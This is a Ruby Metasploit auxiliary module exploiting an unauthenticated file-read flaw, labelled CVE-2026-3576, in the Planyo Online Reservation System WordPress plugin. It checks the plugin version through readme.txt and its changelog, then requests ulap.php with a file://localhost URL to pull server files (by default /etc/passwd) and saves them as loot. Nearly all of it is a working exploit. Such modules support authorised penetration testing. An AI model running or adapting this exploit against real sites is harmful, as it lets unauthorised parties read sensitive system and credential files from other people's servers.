##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress Planyo Online Reservation System Arbitrary File Read (CVE-2026-3576)',
        'Description' => %q{
          This module exploits a Server Side Request Forgery (SSRF) vulnerability in Wordpress's Planyo Online Reservation System v3.0 or less.
          The plugin's AJAX proxy ulap.php does not require authentication and does not validate URL scheme supplied via ulap_url parameter.
          This allows unauthenticated attackers to supply file:// URLs to ulap.php and retrieve local files from the system.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sinn3r', # Used sinn3r's yaws_traversal exploit module as a skeleton
          'Balachandar Gowrisankar'
        ],
        'References' => [
          ['CVE', '2026-3576'],
          ['GHSA', 'jjq9-3x6f-75pj']
        ],
        'DisclosureDate' => '2026-07-10',
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/passwd']),
        OptString.new('TARGETURI', [true, 'Base path to the Wordpress installation', '/'])
      ]
    )
  end

  # Plugin versions prior to 3.1 do not have a stable tag or version in readme.txt. So implemented a module to extract version from changelog portion of readme.txt
  def check_plugin_version_from_changelog(fixed_version)
    changelog_url = normalize_uri(
      datastore['TARGETURI'],
      'wp-content',
      'plugins',
      'planyo-online-reservation-system',
      'readme.txt'
    )
    res = send_request_cgi(
      'uri' => changelog_url,
      'method' => 'GET'
    )

    body = res.body.to_s
    changelog = body[/==\s*Changelog\s*==(.*)/mi, 1]
    unless changelog
      return Msf::Exploit::CheckCode::Detected('Version could not be identified from Stable Tag, Version or Changelog headers')
    end

    version = changelog.scan(/^\s*=\s*v?([0-9A-Za-z._-]+)\s*=\s*$/).last&.first
    unless version
      return Msf::Exploit::CheckCode::Detected('Version number could not be identified from Stable Tag, Version or Changelog headers')
    end

    if Rex::Version.new(version) <= Rex::Version.new(fixed_version)
      return Msf::Exploit::CheckCode::Appears(details: { version: version })
    else
      return Msf::Exploit::CheckCode::Safe(details: { version: version })
    end
  rescue ArgumentError => e
    Msf::Exploit::Checkcode::Detected(e.message)
  end

  def run
    # Check if server is reachable and Wordpress is installed
    unless wordpress_and_online?
      print_error('Server not online or not detected as wordpress')
      return
    end

    # Check if filename is specified
    if datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?
      print_error('Please supply the name of the file you want to download')
      return
    end

    # Check if plugin version is vulnerable
    readme_code = check_plugin_version_from_readme('planyo-online-reservation-system', '3.0')

    if readme_code == Msf::Exploit::CheckCode::Unknown
      print_status('No response for plugin\'s readme.txt or it could not be found')
      return
    elsif readme_code == Msf::Exploit::CheckCode::Safe
      print_good("Planyo plugin found: #{readme_code.details}")
      print_error('This version of plugin is not vulnerable')
      return
    elsif readme_code == Msf::Exploit::CheckCode::Appears
      print_good("Planyo plugin found: #{readme_code.details}")
      print_good('This version of plugin is vulnerable')
    # Check version from changelog section if stable tag or version details are not present in readme.txt
    elsif readme_code == Msf::Exploit::CheckCode::Detected
      changelog_code = check_plugin_version_from_changelog('3.0')
      if changelog_code == Msf::Exploit::CheckCode::Detected
        print_status(changelog_code.message)
        return
      elsif changelog_code == Msf::Exploit::CheckCode::Safe
        print_good("Planyo plugin found: #{changelog_code.details}")
        print_error('This version of plugin is not vulnerable')
        return
      else
        print_good("Planyo plugin found: #{changelog_code.details}")
        print_good('This version of plugin is vulnerable')
      end
    end

    # Create request
    route = normalize_uri(
      datastore['TARGETURI'],
      'wp-content',
      'plugins',
      'planyo-online-reservation-system',
      'ulap.php'
    )
    route += "?ulap_url=file://localhost#{datastore['FILEPATH']}"

    res = send_request_raw({
      'method' => 'GET',
      'uri' => route
    })

    unless res
      fail_with(Failure::Unreachable, 'No response received while attempting LFI')
    end
    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Unexpected HTTP status: #{res.code} while attempting LFI")
    end

    # Show data if needed
    vprint_line(res.to_s)
    fname = File.basename(datastore['FILEPATH'])

    path = store_loot(
      'planyo.http',
      'application/octet-stream',
      datastore['RHOST'],
      res.body,
      fname
    )
    print_status("File saved to: #{path}")
  end
end
